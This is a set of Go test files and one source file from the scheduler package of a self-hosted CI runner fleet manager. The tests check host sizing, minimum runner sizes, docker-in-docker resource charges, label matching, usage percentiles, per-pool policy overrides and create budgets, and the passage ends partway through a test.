		{"a machine large enough", &store.Host{Capacity: 2, Backends: store.StringSlice{"docker"}, CPUs: 16, MemoryMB: 65536}},
		{"a machine that measured nothing", &store.Host{Capacity: 2, Backends: store.StringSlice{"docker"}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, ok := MachineFor(tc.host, dindProfilePool()); ok {
				t.Fatal("a size was named for a machine the pool already fits")
			}
		})
	}
}

// "Twice over" is right for an even split and wrong by more than three times
// for a daemon given 15%: an operator reading it beside a 1 GB minimum would
// expect a 4 GB machine to do, and it never will.
func TestAnUnevenDaemonSplitIsNotCalledTwiceOver(t *testing.T) {
	got := HostShortfall(smallVM(), dindProfilePool())
	if strings.Contains(got, "twice over") {
		t.Fatalf("the shortfall says twice over for a daemon given 15%%: %q", got)
	}
	for _, want := range []string{"3.3 GB of memory to place on", "6.7 GB", "15% of a slot"} {
		if !strings.Contains(got, want) {
			t.Errorf("the shortfall %q does not say %q", got, want)
		}
	}
}

// A machine short only of disk is told the disk it needs and nothing else:
// naming its processors and memory, which already fit, would send an operator
// to order a machine they already have.
func TestAMachineShortOnlyOfDiskIsNamedTheDiskItNeeds(t *testing.T) {
	pool := &store.Pool{Name: "builds", Enabled: true, Backend: store.BackendDocker,
		Resources: store.Resources{CPUs: 1, MemoryMB: 2048, DiskGB: 40}}
	vm := &store.Host{Capacity: 1, Backends: store.StringSlice{"docker"}, CPUs: 8, MemoryMB: 32768,
		DiskTotalMB: 20 << 10, DiskFreeMB: 20 << 10}
	if HostFits(vm, pool) {
		t.Fatal("a 20 GB disk fits a pool that asks for 40, so there is nothing for this test to say")
	}

	need, ok := MachineFor(vm, pool)
	if !ok {
		t.Fatal("no size was named for a machine a larger disk plainly fixes")
	}
	if need.CPUs != 0 || need.MemoryMB != 0 {
		t.Fatalf("named %d CPUs and %d MB as well, which the machine already has", need.CPUs, need.MemoryMB)
	}
	bigger := *vm
	bigger.DiskTotalMB, bigger.DiskFreeMB = need.DiskMB, need.DiskMB
	if !HostFits(&bigger, pool) {
		t.Fatalf("the disk named, %d MB, does not fit the pool either", need.DiskMB)
	}
	if need.DiskMB > 60<<10 {
		t.Fatalf("named %d MB of disk for a pool that asks for 40 GB, which is more than it needs", need.DiskMB)
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The room a pool with a minimum has on a host is the number of runners the
// pass would really place there: as many at the standard size as fit, then one
// more at whatever the machine can spare above the minimum. Counting only the
// standard calls a host that runs a second, smaller runner one that cannot,
// and pool.max_above_room and pool.host_overcommitted then warn about room the
// fleet is using. Counting every runner at the minimum promises the opposite:
// a reduced runner is given all the host can spare, so there is never a
// second one behind it.
func TestHostRoomCountsTheRunnersAMinimumReallyPlaces(t *testing.T) {
	tests := []struct {
		name     string
		memoryMB int64
		pool     *store.Pool
		wantFits int
	}{
		{"a host with room for one standard and one reduced runner holds two", 12 * 1024,
			withMinimum("m", 2, 8*1024, 0, 4*1024), 2},
		{"a host that fits two standard runners exactly holds two", 16 * 1024,
			withMinimum("m", 2, 8*1024, 0, 4*1024), 2},
		{"a leftover below the minimum is not a runner", 10 * 1024,
			withMinimum("m", 2, 8*1024, 0, 4*1024), 1},
		{"a host below the standard holds one runner given all it has, not several at the minimum", 7 * 1024,
			withMinimum("m", 2, 8*1024, 0, 3*1024), 1},
		{"a host below the minimum holds nothing", 3 * 1024,
			withMinimum("m", 2, 8*1024, 0, 4*1024), 0},
		{"a pool with no minimum counts the standard alone", 12 * 1024,
			limited("m", 2, 8*1024), 1},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			h := sized("h", 8, 32, hostFor(tc.memoryMB), 500*1024)
			got := HostRoomFor(h, tc.pool)
			if got.Fits != tc.wantFits {
				t.Errorf("HostRoomFor = %+v, want fits %d", got, tc.wantFits)
			}
			// The pass is the arithmetic's witness: the count must be what
			// placement actually does on the same empty machine.
			hs := newHostSet([]*store.Host{h}, []*store.Pool{tc.pool}, nil, now)
			if placed := hs.placeAvoiding(tc.pool, 8, nil); len(placed) != tc.wantFits {
				t.Errorf("the pass placed %d runners, want the %d the room promises", len(placed), tc.wantFits)
			}
		})
	}
}

// When a pool with a minimum is blocked, the resource named is the one short
// of the minimum, not the one short of the standard. A host with memory for a
// reduced runner and no CPU for one is out of CPU; "short of memory" would send
// the operator to add memory the pool could already run in.
func TestABlockedPoolWithAMinimumNamesWhatIsShortOfTheMinimum(t *testing.T) {
	tests := []struct {
		name string
		left Reservation
		want string
	}{
		{"memory above the minimum and CPU below it is short of CPU",
			Reservation{CPUs: 1, MemoryMB: 6 * 1024, DiskMB: 100 * 1024}, "short of CPU"},
		{"CPU above the minimum and memory below it is short of memory",
			Reservation{CPUs: 3, MemoryMB: 3 * 1024, DiskMB: 100 * 1024}, "short of memory"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			h := sized("h", 8, 32, hostFor(32*1024), 500*1024)
			p := withMinimum("m", 4, 8*1024, 2, 4*1024)
			hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
			hs.left[h.ID] = tc.left
			hs.promisedMemory[h.ID] = tc.left.MemoryMB
			if placed := hs.placeAvoiding(p, 1, nil); len(placed) != 0 {
				t.Fatalf("placed %+v on a host short of the minimum", placed)
			}
			if got := hs.why(p).what; !strings.Contains(got, tc.want) {
				t.Errorf("why = %q, want it to say %q", got, tc.want)
			}
		})
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The report that found this: a runner of a pool that left its size to the
// host was killed for want of memory, and raising the pool's minimum could not
// help -- a minimum above the slot share left the host out altogether, so the
// only way to give a runner more was to lower the host's capacity. The minimum
// is the least a runner may have, so a share under it is raised to it: each
// runner is given and charged the minimum, and the host holds as many as its
// machine covers rather than none.
func TestAMinimumAboveTheShareIsGivenRatherThanRefused(t *testing.T) {
	// 16 GB over eight slots is a 2 GB share; the pool will take no less
	// than 4 GB.
	h := sized("h", 8, 16, hostFor(16*1024), 100000)
	p := automatic("auto", 0, 4096)

	if field := ShareTooSmall(h, p); field != "" {
		t.Fatalf("ShareTooSmall = %q, want a share under the minimum to be raised to it", field)
	}
	if !HostFits(h, p) {
		t.Fatalf("the host was refused: %s", HostShortfall(h, p))
	}
	if got := Reserve(p, h).MemoryMB; got != 4096 {
		t.Errorf("charge = %d MB, want the 4096 MB minimum", got)
	}
	got, source := Allocation(p, h, true)
	if got.MemoryMB != 4096 || source != store.AllocationFromHost {
		t.Errorf("Allocation = %+v from %q, want 4096 MB from the host", got, source)
	}

	// The slots are eight and the machine covers four runners of 4 GB: the
	// room says four, and the pass places four -- all of them whole, not
	// reduced.
	room := HostRoomFor(h, p)
	if room.Room != 4 || room.LimitedBy != "memory" {
		t.Errorf("HostRoomFor = %+v, want room for 4, limited by memory", room)
	}
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	placed := hs.placeAvoiding(p, 8, nil)
	if len(placed) != 4 {
		t.Fatalf("the pass placed %d runners, want the 4 the room promises", len(placed))
	}
	for _, pl := range placed {
		if pl.size != nil {
			t.Errorf("a runner was placed reduced to %+v, want every one at the minimum", *pl.size)
		}
	}

	note := HostReduction(h, p)
	for _, w := range []string{"2 GB of memory", "4 GB", "fewer of them than its 8 slots"} {
		if !strings.Contains(note, w) {
			t.Errorf("HostReduction = %q, want it to contain %q", note, w)
		}
	}
}

// The minimum is the floor, never the size: where the share is larger, the
// runner is given all of it.
func TestAShareAboveTheMinimumIsGivenWhole(t *testing.T) {
	h := sized("h", 2, 16, hostFor(16*1024), 100000)
	p := automatic("auto", 1, 2048)

	got, _ := Allocation(p, h, true)
	share := HostShare(h)
	if got.MemoryMB != share.MemoryMB || got.CPUs != share.CPUs {
		t.Errorf("Allocation = %+v, want the whole share %+v rather than the minimum", got, share)
	}
	if HostReduction(h, p) != "" {
		t.Errorf("HostReduction = %q on a host whose share covers the minimum", HostReduction(h, p))
	}
}

// A docker-in-docker slot carries a runner and its daemon, and the minimum is
// per container, so a share under it is raised to twice the minimum -- which
// the backend then splits, giving each container the minimum.
func TestADinDSlotUnderItsMinimumIsGivenTwiceIt(t *testing.T) {
	h := sized("h", 8, 16, hostFor(16*1024), 100000)
	p := automatic("auto", 1, 2048)
	p.DockerMode = store.DockerDinD

	got, _ := Allocation(p, h, true)
	if got.MemoryMB != 4096 || got.CPUs != 2 {
		t.Errorf("Allocation = %+v, want the pair's 2 CPU and 4096 MB", got)
	}
	runner, daemon := got.SplitWithDaemon()
	if runner.MemoryMB != 2048 || daemon.MemoryMB != 2048 {
		t.Errorf("split = %+v and %+v, want the 2048 MB minimum each", runner, daemon)
	}
	if r := Reserve(p, h); r.MemoryMB != 4096 || r.CPUs != 2 {
		t.Errorf("charge = %+v, want one slot of the pair's 2 CPU and 4096 MB", r)
	}
}

// A pool with no minimum is exactly what it was: a share too thin to run a
// runner refuses the host, because nobody said the runner should be larger.
func TestAThinShareWithNoMinimumIsStillRefused(t *testing.T) {
	h := sized("h", 32, 8, hostFor(16*1024), 100000)
	p := automatic("auto", 0, 0)
	if field := ShareTooSmall(h, p); field != "cpu" {
		t.Errorf("ShareTooSmall = %q, want the 0.2 CPU share refused", field)
	}
}

package scheduler

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// withMinimum is a fixed-size pool that will accept a smaller runner when no
// host has room for the standard.
func withMinimum(name string, cpus float64, memoryMB int64, minCPUs float64, minMemoryMB int64) *store.Pool {
	p := limited(name, cpus, memoryMB)
	p.Resources.MinCPUs = minCPUs
	p.Resources.MinMemoryMB = minMemoryMB
	return p
}

// The case the minimum exists for: a machine a little short of the standard
// size. Without a minimum the job waits for a host that is never coming; with
// one it runs, and with as much of the standard as the host can spare rather
// than the minimum, because the minimum is what the operator will accept and
// not what they asked for.
func TestAHostJustShortOfTheStandardRunsTheJobWithAllItCanSpare(t *testing.T) {
	h := sized("short", 1, 16, hostFor(30*1024), 100000)
	p := withMinimum("big", 8, 32*1024, 4, 24*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	placed := hs.placeAvoiding(p, 1, nil)
	if len(placed) != 1 || placed[0].hostID != "short" {
		t.Fatalf("placed %+v, want one runner on the short host", placed)
	}
	size := placed[0].size
	if size == nil {
		t.Fatal("the runner was placed at the standard size on a host that has no room for it")
	}
	if size.MemoryMB != 30*1024 {
		t.Errorf("memory = %d MB, want the 30 GB the host has, not the %d MB minimum", size.MemoryMB, p.Resources.MinMemoryMB)
	}
	if size.CPUs != 8 {
		t.Errorf("CPU = %g, want the standard 8: the host has room for all of it", size.CPUs)
	}

	// The pool with no minimum is exactly what it was: it does not fit.
	plain := limited("big", 8, 32*1024)
	hs = newHostSet([]*store.Host{h}, []*store.Pool{plain}, nil, now)
	if got := hs.placeAvoiding(plain, 1, nil); len(got) != 0 {
		t.Fatalf("a pool with no minimum was placed on a host too small for it: %+v", got)
	}
}

// A minimum never shrinks a runner the fleet could have given the full size
// to: the standard goes on any host with room for it, even when a short host
// would score better, and the reduced size is only the fallback.
func TestTheStandardSizeWinsWhereverAHostHasRoomForIt(t *testing.T) {
	short := sized("a-short", 4, 16, hostFor(30*1024), 100000)
	whole := sized("b-whole", 1, 16, hostFor(32*1024), 100000)
	p := withMinimum("big", 8, 32*1024, 4, 24*1024)

	hs := newHostSet([]*store.Host{short, whole}, []*store.Pool{p}, nil, now)
	placed := hs.placeAvoiding(p, 2, nil)
	if len(placed) != 2 {
		t.Fatalf("placed %+v, want two runners", placed)
	}
	if placed[0].hostID != "b-whole" || placed[0].size != nil {
		t.Errorf("first runner = %+v, want the standard size on the host with room for it", placed[0])
	}
	if placed[1].hostID != "a-short" || placed[1].size == nil {
		t.Errorf("second runner = %+v, want a reduced size on the short host once the whole one is full", placed[1])
	}
}

// Below the minimum is still no: a floor is a floor.
func TestAHostBelowTheMinimumTakesNothing(t *testing.T) {
	h := sized("tiny", 1, 16, hostFor(20*1024), 100000)
	p := withMinimum("big", 8, 32*1024, 4, 24*1024)
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.placeAvoiding(p, 1, nil); len(got) != 0 {
		t.Fatalf("placed %+v below the pool's 24 GB minimum", got)
	}
	if HostFits(h, p) {
		t.Error("HostFits says a 20 GB host can run a pool whose minimum is 24 GB")
	}
	if HostShortfall(h, p) == "" {
		t.Error("no shortfall named for a host below the minimum")
	}
}

// A reduced runner is charged what it was given. Charging it the standard
// would read a host filled with reduced runners as over-committed and refuse
// the next one it had room for.
func TestAReducedRunnerIsChargedWhatItWasGiven(t *testing.T) {
	h := sized("short", 2, 16, hostFor(40*1024), 100000)
	p := withMinimum("big", 8, 32*1024, 4, 16*1024)
	reduced := &store.Runner{ID: "r1", PoolID: p.ID, HostID: h.ID, State: store.RunnerBusy,
		AllocatedCPUs: 8, AllocatedMemoryMB: 20 * 1024, AllocationSource: store.AllocationReduced}
	runners := map[string][]*store.Runner{p.ID: {reduced}}

	if got := Reserved(h, []*store.Pool{p}, runners); got.MemoryMB != 20*1024 {
		t.Errorf("reserved memory = %d MB, want the 20 GB the reduced runner was given", got.MemoryMB)
	}
	// 40 GB less the 20 GB promised leaves 20: short of the standard, above
	// the minimum, so the second runner is reduced too, to what is left.
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, runners, now)
	placed := hs.placeAvoiding(p, 1, nil)
	if len(placed) != 1 || placed[0].size == nil || placed[0].size.MemoryMB != 20*1024 {
		t.Fatalf("placed %+v, want a second runner reduced to the 20 GB left", placed)
	}
}

// A docker-in-docker runner gives its daemon the same limits it has, so the
// pair is charged twice what each is given, and a reduced pair splits what the
// host can spare between them.
func TestAReducedDockerInDockerPairSplitsWhatIsLeft(t *testing.T) {
	h := sized("short", 1, 16, hostFor(12*1024), 100000)
	p := withMinimum("builds", 4, 8*1024, 2, 4*1024)
	p.DockerMode = store.DockerDinD

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	placed := hs.placeAvoiding(p, 1, nil)
	if len(placed) != 1 || placed[0].size == nil {
		t.Fatalf("placed %+v, want one reduced pair", placed)
	}
	if got := placed[0].size.MemoryMB; got != 6*1024 {
		t.Errorf("each container = %d MB, want 6 GB: half of the 12 GB the host can spare", got)
	}
}

// A reduced docker-in-docker runner's row holds the per-container limit --
// what ReducedSize hands to the backend, and what the previous test reads off
// placed[0].size -- not the host-side charge that placement actually
// subtracted. RunnerCharge has to double a typed field back to recover that
// charge, the same doubling Reserve applies to a full-size pair. Get the
// factor backwards and a host already holding one of these runners is read as
// half as loaded as it is: exactly the mismatch Reserve's own comment warns
// about ("a host read as half committed while its containers' quotas added up
// to every core it had").
func TestAReducedDockerInDockerRunnerIsChargedTwiceItsRow(t *testing.T) {
	h := sized("short", 1, 16, hostFor(12*1024), 100000)
	p := withMinimum("builds", 4, 8*1024, 2, 4*1024)
	p.DockerMode = store.DockerDinD

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	placed := hs.placeAvoiding(p, 1, nil)
	if len(placed) != 1 || placed[0].size == nil {
		t.Fatalf("placed %+v, want one reduced pair", placed)
	}
	grant := *placed[0].size

	r := &store.Runner{ID: "r1", PoolID: p.ID, HostID: h.ID, State: store.RunnerBusy,
		AllocatedCPUs: grant.CPUs, AllocatedMemoryMB: grant.MemoryMB, AllocationSource: store.AllocationReduced}

	got := RunnerCharge(p, h, r)
	if got.CPUs != grant.CPUs*2 {
		t.Errorf("CPU charge = %g, want double the row's per-container %g: a docker-in-docker pair is charged for both containers", got.CPUs, grant.CPUs)
	}
	if got.MemoryMB != grant.MemoryMB*2 {
		t.Errorf("memory charge = %d MB, want double the row's per-container %d MB", got.MemoryMB, grant.MemoryMB)
	}

	// Reserved sums RunnerCharge across a host's live runners -- the figure
	// the next reconcile pass trusts to know what room is left. It must agree
	// with what the placement pass just subtracted for this exact runner.
	runners := map[string][]*store.Runner{p.ID: {r}}
	if reserved := Reserved(h, []*store.Pool{p}, runners); reserved != got {
		t.Errorf("Reserved = %+v, want it to match RunnerCharge's %+v for the host's one live runner", reserved, got)
	}
}

// The create's reason says the runner is smaller than its pool asks for, and
// the action carries the size, so the Runners page and the scaling history
// both explain a slow job on a reduced runner.
func TestAReducedCreateSaysSoInItsReason(t *testing.T) {
	h := sized("short", 1, 16, hostFor(30*1024), 100000)
	p := withMinimum("big", 8, 32*1024, 4, 24*1024)
	p.Labels = store.NormalizeLabels([]string{"big"})
	s := snap([]*store.Pool{p}, nil, []*store.Job{queued("j1", time.Minute, "big")}, []*store.Host{h})
	creates := actionsOf(Decide(s).Actions, ActionCreate)
	if len(creates) != 1 {
		t.Fatalf("creates = %+v, want one", creates)
	}
	if creates[0].Size == nil || creates[0].Size.MemoryMB != 30*1024 {
		t.Errorf("size = %+v, want 30 GB carried on the action", creates[0].Size)
	}
	if !strings.Contains(creates[0].Reason, "reduced to 8 CPU and 30 GB") {
		t.Errorf("reason = %q, want it to say the runner was reduced and to what", creates[0].Reason)
	}
}

package scheduler

import (
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// A runner registered with --no-default-labels advertises only its own labels,
// so GitHub never offers it a job asking for self-hosted, linux or x64. Were
// the scheduler to match such a job anyway, it would start a runner the job can
// never reach and the job would wait while the pool reported itself busy.
func TestAPoolWithoutDefaultLabelsMatchesOnlyWhatItLists(t *testing.T) {
	bare := &store.Pool{Labels: store.StringSlice{"gpu"}, NoDefaultLabels: true}
	listed := &store.Pool{Labels: store.StringSlice{"gpu", "self-hosted", "linux"}, NoDefaultLabels: true}
	usual := &store.Pool{Labels: store.StringSlice{"gpu"}}

	tests := []struct {
		name string
		pool *store.Pool
		job  []string
		want bool
	}{
		{"its own label alone", bare, []string{"gpu"}, true},
		{"self-hosted it does not advertise", bare, []string{"self-hosted", "gpu"}, false},
		{"an os it does not advertise", bare, []string{"linux", "gpu"}, false},
		{"implicit labels it lists itself", listed, []string{"self-hosted", "linux", "gpu"}, true},
		{"an arch it still does not list", listed, []string{"x64", "gpu"}, false},
		{"an ordinary pool is unchanged", usual, []string{"self-hosted", "linux", "gpu"}, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := PoolMatches(tc.pool, tc.job); got != tc.want {
				t.Fatalf("PoolMatches(%v, %v) = %v, want %v", tc.pool.Labels, tc.job, got, tc.want)
			}
		})
	}
}

func TestBestPoolPassesOverAPoolWithoutDefaultLabelsForASelfHostedJob(t *testing.T) {
	// Named to sort first, so only the label rule can keep it from winning.
	bare := &store.Pool{ID: "p1", Name: "a-bare", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, NoDefaultLabels: true, Enabled: true}
	usual := &store.Pool{ID: "p2", Name: "b-usual", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: true}

	if got := BestPool([]*store.Pool{bare, usual}, job("self-hosted", "gpu")); got == nil || got.Name != "b-usual" {
		t.Fatalf("BestPool = %v, want b-usual", got)
	}
	if got := BestPool([]*store.Pool{bare, usual}, job("gpu")); got == nil || got.Name != "a-bare" {
		t.Fatalf("BestPool = %v, want a-bare for a job that names only gpu", got)
	}
	if ok, why := Eligible(bare, job("self-hosted", "gpu")); ok || why == "" {
		t.Fatalf("Eligible = %v, %q; want a refusal with a reason", ok, why)
	}
}

package scheduler

import (
	"math"
	"slices"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// Figures are three points of one dimension of what a job's runs used: the
// median, the figure all but the heaviest twentieth stayed under, and the most.
type Figures struct {
	P50 float64 `json:"p50"`
	P95 float64 `json:"p95"`
	Max float64 `json:"max"`
}

// Observed is what a job's measured runs did, as figures a person can check
// the class against. It is the measurement and nothing else: a run the kernel
// killed appears at the peak it recorded, not at the figure the class rule
// treats it as having needed, because a reader who sees a max above every
// recorded peak would rightly stop trusting the page.
type Observed struct {
	// Runs is how many runs the figures were taken from, which is bounded by
	// the window and the history limit and so can differ from the count the
	// class was kept with.
	Runs int `json:"runs"`
	// Window is the span the runs were read from. The controller renders it
	// once on the page rather than on every row.
	Window   time.Duration `json:"-"`
	CPU      Figures       `json:"cpu"`
	MemoryMB Figures       `json:"memory_mb"`
}

// Observe turns a job's measured runs into the figures behind its advice: the
// nearest-rank percentiles of their peaks, the same rank rule the class is
// decided by, so the p95 here and the p90 in the class's reason agree on what
// a percentile means. A run that measured nothing in a dimension contributes
// nothing to that dimension; a zero would pull the median down to a figure no
// run showed. The zero value is "no runs".
func Observe(runs []store.JobRun) Observed {
	out := Observed{Runs: len(runs)}
	var cpus, mem []float64
	for _, r := range runs {
		if r.PeakCPUs > 0 {
			cpus = append(cpus, r.PeakCPUs)
		}
		if r.PeakMemoryMB > 0 {
			mem = append(mem, float64(r.PeakMemoryMB))
		}
	}
	out.CPU = figuresOf(cpus)
	out.MemoryMB = figuresOf(mem)
	return out
}

// figuresOf is the nearest-rank p50, p95 and max of samples, zero for none.
func figuresOf(samples []float64) Figures {
	if len(samples) == 0 {
		return Figures{}
	}
	slices.Sort(samples)
	n := len(samples)
	return Figures{
		P50: samples[nearestRank(0.5, n)],
		P95: samples[nearestRank(0.95, n)],
		Max: samples[n-1],
	}
}

// nearestRank is the index of percentile p in n sorted samples by the
// nearest-rank method: the smallest sample that at least p of them are at or
// under. It is percentileIndex with the percentile as an argument.
func nearestRank(p float64, n int) int {
	return clamp(int(math.Ceil(p*float64(n)))-1, 0, n-1)
}

package scheduler

import (
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

func measured(n int) []store.JobRun {
	runs := make([]store.JobRun, n)
	for i := range runs {
		runs[i] = store.JobRun{PeakCPUs: float64(i+1) / 10, PeakMemoryMB: int64((i + 1) * 100)}
	}
	return runs
}

// The figures are the nearest-rank percentiles of what the runs used, the same
// rank rule the class is decided by, so a reader can put the p95 beside the
// class's reason and see them agree.
func TestObserveIsTheNearestRankPercentilesOfWhatRunsUsed(t *testing.T) {
	got := Observe(measured(10))
	if got.Runs != 10 {
		t.Fatalf("runs = %d, want 10", got.Runs)
	}
	if got.MemoryMB != (Figures{P50: 500, P95: 1000, Max: 1000}) {
		t.Fatalf("memory = %+v, want p50 500, p95 1000, max 1000", got.MemoryMB)
	}
	if got.CPU != (Figures{P50: 0.5, P95: 1, Max: 1}) {
		t.Fatalf("cpu = %+v, want p50 0.5, p95 1, max 1", got.CPU)
	}
}

// One run is one figure three times over: never a division by zero and never
// an empty block, because a sparse row still shows what it has.
func TestObserveOfOneRunIsThatRun(t *testing.T) {
	got := Observe([]store.JobRun{{PeakCPUs: 2.5, PeakMemoryMB: 3000}})
	if got.Runs != 1 || got.MemoryMB != (Figures{P50: 3000, P95: 3000, Max: 3000}) || got.CPU != (Figures{P50: 2.5, P95: 2.5, Max: 2.5}) {
		t.Fatalf("observed = %+v", got)
	}
}

// The figures are what happened; the class is the rule. A run the kernel
// killed is treated as having needed half as much again when the class is
// decided, and that treated figure must not appear as a measurement.
func TestObserveReportsAKilledRunsRecordedPeakNotItsTreatedFigure(t *testing.T) {
	got := Observe([]store.JobRun{{PeakMemoryMB: 3000, GrantedMemoryMB: 3000, OOMKilled: true}})
	if got.MemoryMB.Max != 3000 {
		t.Fatalf("max memory = %v, want the recorded peak 3000", got.MemoryMB.Max)
	}
}

// A run that measured nothing in a dimension is not a zero in that dimension:
// a zero would pull the p50 down to a figure no run showed.
func TestObserveLeavesOutADimensionARunDidNotMeasure(t *testing.T) {
	got := Observe([]store.JobRun{{PeakMemoryMB: 3000}, {PeakMemoryMB: 1000, PeakCPUs: 2}})
	if got.Runs != 2 || got.MemoryMB.P50 != 1000 || got.CPU != (Figures{P50: 2, P95: 2, Max: 2}) {
		t.Fatalf("observed = %+v", got)
	}
}

func TestObserveOfNothingIsZero(t *testing.T) {
	if got := Observe(nil); got != (Observed{}) {
		t.Fatalf("observed = %+v, want the zero value", got)
	}
}

package scheduler

import (
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

func dur(d time.Duration) *store.Duration {
	v := store.Duration(d)
	return &v
}

// A pool that overrides nothing follows the fleet, and keeps following it.
//
// This is what makes the fleet's figures worth changing: a pool that had them
// copied onto it at creation would be frozen on whatever they were that day,
// and an operator raising scheduler.provision_timeout for a fleet on a slow
// registry would raise it for no pool at all.
func TestAPoolThatOverridesNothingFollowsTheFleet(t *testing.T) {
	fleet := Policy{
		ScaleUpDelay:      10 * time.Second,
		MaxRunnerLifetime: 24 * time.Hour,
		ProvisionTimeout:  10 * time.Minute,
		DrainTimeout:      5 * time.Minute,
		MaxCreatesPerTick: 4,
	}
	got := fleet.For(&store.Pool{Name: "zoomies-plain"})
	if got != fleet {
		t.Errorf("For() = %+v, want the fleet's own %+v", got, fleet)
	}
	if got := fleet.For(nil); got != fleet {
		t.Errorf("For(nil) = %+v, want the fleet's own %+v", got, fleet)
	}
}

// Each override replaces exactly one figure and leaves the rest alone, so a
// pool that has something to say about registering does not thereby have
// something to say about draining.
func TestAnOverrideReplacesOneFigure(t *testing.T) {
	fleet := Policy{
		ScaleUpDelay:      10 * time.Second,
		MaxRunnerLifetime: 24 * time.Hour,
		ProvisionTimeout:  10 * time.Minute,
		DrainTimeout:      5 * time.Minute,
		MaxCreatesPerTick: 4,
	}
	pool := &store.Pool{Name: "zoomies-windows", RunnerSettings: store.RunnerSettings{
		ProvisionTimeout: dur(45 * time.Minute),
	}}
	got := fleet.For(pool)
	if got.ProvisionTimeout != 45*time.Minute {
		t.Errorf("provision timeout = %s, want the pool's 45m", got.ProvisionTimeout)
	}
	if got.DrainTimeout != fleet.DrainTimeout || got.ScaleUpDelay != fleet.ScaleUpDelay ||
		got.MaxRunnerLifetime != fleet.MaxRunnerLifetime {
		t.Errorf("one override changed the others: %+v", got)
	}
}

// Zero is a real answer rather than "unset", which is the whole reason these
// are pointers. A pool on an air-gapped registry that pulls for half an hour
// means "never fail a runner for taking too long to register", and a type that
// read its zero as "nothing said" would give it the fleet's ten minutes back.
func TestZeroIsAnAnswerAndNotAnAbsence(t *testing.T) {
	fleet := Policy{ProvisionTimeout: 10 * time.Minute, DrainTimeout: 5 * time.Minute}
	pool := &store.Pool{Name: "zoomies-airgapped", RunnerSettings: store.RunnerSettings{
		ProvisionTimeout: dur(0),
	}}
	if got := fleet.For(pool); got.ProvisionTimeout != 0 {
		t.Errorf("provision timeout = %s, want 0: the pool asked for no timeout at all", got.ProvisionTimeout)
	}
}

// The fleet-wide create budget is not a pool's to raise. It is shared between
// pools, so a pool that could lift its own share would be taking the
// protection from the others.
func TestTheCreateBudgetIsNotOverridable(t *testing.T) {
	fleet := Policy{MaxCreatesPerTick: 4}
	pool := &store.Pool{Name: "zoomies-greedy", RunnerSettings: store.RunnerSettings{
		ScaleUpDelay: dur(0),
	}}
	if got := fleet.For(pool); got.MaxCreatesPerTick != 4 {
		t.Errorf("max creates per tick = %d, want the fleet's 4", got.MaxCreatesPerTick)
	}
}

// Set is what every surface asks before it says a pool has overrides at all.
func TestSetSaysWhetherAPoolOverridesAnything(t *testing.T) {
	if (store.RunnerSettings{}).Set() {
		t.Error("an empty RunnerSettings reports itself as set")
	}
	if !(store.RunnerSettings{DockerWait: dur(2 * time.Minute)}).Set() {
		t.Error("a pool with a docker wait reports itself as unset")
	}
	if !(store.RunnerSettings{ProvisionTimeout: dur(0)}).Set() {
		t.Error("an override of zero reports itself as unset; zero is an answer")
	}
}

package scheduler

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// A top-priority pool with a deep backlog used to take every create of every
// tick, so a lower tier's jobs waited for as long as that backlog lasted. The
// share across tiers bounds that wait to one interval, without taking a burst
// at the top away from it before a lower tier has waited at all.
func TestCreateBudgetIsSharedAcrossPrioritiesOnlyAfterAFullInterval(t *testing.T) {
	const interval = 30 * time.Second
	cases := []struct {
		name      string
		lowWaited time.Duration
		interval  time.Duration
		budget    int
		wantHigh  int
		wantLow   int
		deferred  bool
		// first is the pool whose create executes first. The share goes
		// ahead of the tier it was taken from, so that registration
		// admission cutting a plan short cannot cut the share out of it.
		first string
	}{
		{"a lower tier that has waited a full interval gets a share", interval, interval, 3, 2, 1, true, "low"},
		{"a lower tier that waited longer than an interval gets a share", 2 * interval, interval, 3, 2, 1, true, "low"},
		{"a lower tier that has not waited an interval does not take from the top", interval - time.Second, interval, 3, 3, 0, false, "high"},
		{"with no interval priority alone decides", time.Hour, 0, 3, 3, 0, false, "high"},
		{"an uncapped tick serves both tiers in priority order", interval, interval, 0, 5, 1, false, "high"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			high, low := testPool("high", "high"), testPool("low", "low")
			high.Priority, low.Priority = 10, 0
			var jobs []*store.Job
			for _, id := range []string{"h1", "h2", "h3", "h4", "h5"} {
				jobs = append(jobs, queued(id, time.Minute, "high"))
			}
			jobs = append(jobs, queued("l1", tc.lowWaited, "low"))
			s := snap([]*store.Pool{high, low}, nil, jobs, []*store.Host{testHost("host_a", 20, 0)})
			s.Policy.MaxCreatesPerTick = tc.budget
			s.Policy.Interval = tc.interval

			plan := Decide(s)
			byName := map[string]PoolPlan{}
			for _, pp := range plan.Pools {
				byName[pp.PoolName] = pp
			}
			if got := countOf(byName["high"].Actions, ActionCreate); got != tc.wantHigh {
				t.Errorf("high creates = %d, want %d", got, tc.wantHigh)
			}
			if got := countOf(byName["low"].Actions, ActionCreate); got != tc.wantLow {
				t.Errorf("low creates = %d, want %d", got, tc.wantLow)
			}
			if len(plan.Actions) == 0 || plan.Actions[0].PoolName != tc.first {
				t.Errorf("first action = %+v, want a create for %s", plan.Actions, tc.first)
			}
